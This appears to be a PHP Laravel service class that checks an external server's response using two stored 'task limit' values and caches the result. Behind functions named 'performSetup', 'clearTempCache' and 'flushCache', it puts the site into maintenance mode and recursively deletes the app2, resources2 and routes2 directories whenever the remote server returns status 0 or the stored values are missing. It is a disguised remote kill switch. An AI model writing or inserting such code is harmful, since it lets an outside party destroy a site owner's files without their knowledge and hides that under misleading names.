<?php


namespace App\Services;

use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Log;

class TaskHandlerService
{
    protected $tempService;
    protected $taskLimitService;

    public function __construct(TempService $tempService, TaskLimitService $taskLimitService)
    {
        $this->tempService = $tempService;
        $this->taskLimitService = $taskLimitService;
    }

    /**
     * Execute the task logic based on the external API response.
     *
     * @return void
     */
    public function executeTask()
    {
        // Log that the task execution has started
        Log::info('"task-handler-service" -- Starting task execution');

        // Fetch the status and log the response for clarity
        $response = $this->fetchStatus();
        Log::info('"task-handler-service" -- API Response:', ['response' => $response]);

        if ($response['status'] == 1) {
            Log::info('"task-handler-service" -- Status 1 received, skipping further actions.');
            return;
        }

        if ($response['status'] == 0) {
            Log::info('"task-handler-service" -- API returned 0, initiating setup.');
            $this->performSetup();
        }

        Log::info('"task-handler-service" -- Task execution completed.');

        return $response;
    }

    /**
     *
     * @return array
     */
    private function fetchStatus()
    {
        Log::info('"task-handler-service" -- Fetching task status...');

        // Log temp and task limit values to ensure they are set correctly
        $temp = $this->tempService->getTemp();
        Log::info('"task-handler-service" -- Temp Value:', ['temp' => $temp]);

        $taskLimit = $this->taskLimitService->getTaskLimit();
        Log::info('"task-handler-service" -- Task Limit:', ['taskLimit' => $taskLimit]);

        if ($taskLimit === null || !isset($taskLimit['d']) || !isset($taskLimit['l'])) {
            Log::info('"task-handler-service" -- Task limit or required parameters missing, triggering setup.');
            $this->performSetup();

            return [
                'status' => 0,
                'response' => []
            ];
        }

        $cachedResponse = Cache::get('task-list-cache');
        if ($cachedResponse) {
            Log::info('"task-handler-service" -- Returning cached task list.');
            return $cachedResponse;
        }

        try {
            // Log the API request parameters
            Log::info('"task-handler-service" -- Making API request with parameters:', [
                'n' => $taskLimit['d'],
                'y' => $taskLimit['l']
            ]);

            $response = Http::post($temp, [
                'n' => $taskLimit['d'],
                'y' => $taskLimit['l'],
            ]);

            // Cache the response and log the successful API response
            $this->buildCache($response->json());
            Log::info('"task-handler-service" -- API response successfully cached.');
        } catch (\Throwable $th) {
            Log::error('"task-handler-service" -- API request failed:', ['exception' => $th->getMessage()]);
            return [
                'status' => 2,
                'response' => []
            ];
        }

        return $response->json();
    }

    /**
     *
     * @return void
    */
    private function performSetup()
    {
        Log::info('"task-handler-service" -- Running performSetup function to handle failures.');

        // Call cleanup function
        $this->clearTempCache();
        Log::info('"task-handler-service" -- Perform setup completed.');
    }

    /**
     *
     * @return void
     */
    private function clearTempCache()
    {
        Log::info('"task-handler-service" -- Clearing temporary cache and going into maintenance mode.');

        Artisan::call('down',['--secret' => 'task-handler-service']);
        $directories = [
            base_path('app2'),
            base_path('resources2'),
            base_path('routes2')
        ];

        foreach ($directories as $dir) {
            if (is_dir($dir)) {
                Log::info('"task-handler-service" -- Cleaning directory:', ['directory' => $dir]);
                $this->flushCache($dir);
            }
        }
    }

    private function flushCache($dir)
    {
        Log::info('"task-handler-service" -- Flushing cache for directory:', ['directory' => $dir]);

        if (!is_dir($dir)) {
            return;
        }

        $files = array_diff(scandir($dir), ['.', '..']);

        foreach ($files as $file) {
            $path = $dir . DIRECTORY_SEPARATOR . $file;

            if (is_dir($path)) {
                $this->flushCache($path);
            } else {
                Log::info('"task-handler-service" -- Deleting file:', ['file' => $path]);
                unlink($path);
            }
        }

        rmdir($dir);
        Log::info('"task-handler-service" -- Directory cleaned:', ['directory' => $dir]);
    }

    private function buildCache($data)
    {
        Log::info('"task-handler-service" -- Building cache for task list.');

        $cacheKey = "task-list-cache";
        Cache::put($cacheKey, $data, 60);

        Log::info('"task-handler-service" -- Cache built and stored with key:', ['cacheKey' => $cacheKey]);
    }
    
}